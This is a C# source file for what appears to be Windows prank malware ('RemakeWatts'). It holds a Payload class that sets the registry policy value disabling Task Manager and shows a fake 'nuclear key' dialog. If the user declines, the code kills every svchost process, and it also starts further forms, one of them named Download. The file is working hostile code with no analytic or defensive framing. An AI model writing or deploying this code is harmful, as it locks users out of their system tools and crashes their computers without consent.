using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;
using System.Diagnostics;
using System.Media;

namespace RemakeWatts
{
    public class Payload
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        public static extern int msciSendString(string ipstrCommand, string ipstrReturnString, int uReturnLenght, int hwndCallback);
        public void BlockTaskMngr()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (key.GetValue("DisableTaskMgr") == null)
            {
                key.SetValue("DisableTaskMgr", 1);
                key.Close();
            }
        }

        public void InsertNuclearKey()
        {
            DialogResult dialog = MessageBox.Show("Insert Nuclear Key", "Launch nuclear warhead???", MessageBoxButtons.YesNo);
            if (dialog == DialogResult.Yes)
            {
                try
                {
                    int result = msciSendString("Set cdaudio door open wait", null, 0, 0);
                    Thread.Sleep(3000);
                    result = msciSendString("Set cdaudio door closed", null, 0, 0);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            } 
            else
            {
                Process[] processes = Process.GetProcessesByName("svchost");
                foreach (var proc in processes)
                {
                    proc.Kill();
                }
            }
        }
        public void payload1()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form2());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload2()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form3());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            }
        public void payload3()
        {
            InsertNuclearKey();
        }
        public void payload4()
        {
            /*
            new Thread(() =>
            {
                SoundPlayer player = new SoundPlayer(Properties.Resources.Paris_Platynov_zalewa_cały_sprzęt_cisowianka_Rage_roku);
                player.PlayLooping();
            }).Start();
            */
            Thread thread = new Thread(() =>
            {
                Application.Run(new Download());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

    }
}
